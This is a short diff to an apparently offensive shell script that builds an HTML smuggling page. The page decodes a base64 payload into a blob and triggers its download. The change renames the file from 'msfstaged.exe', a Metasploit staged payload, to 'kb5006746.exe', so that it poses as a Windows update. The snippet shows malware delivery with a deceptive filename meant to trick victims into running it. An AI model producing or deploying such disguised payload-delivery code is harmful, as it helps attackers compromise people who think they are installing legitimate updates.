@@ -32,7 +32,7 @@ if [ $? -eq 0 ]; then
           var file ='${base64_string}';
           var data = base64ToArrayBuffer(file);
           var blob = new Blob([data], {type: 'octet/stream'});
-          var fileName = 'msfstaged.exe';
+          var fileName = 'kb5006746.exe';
 
           var a = document.createElement('a');
           document.body.appendChild(a);
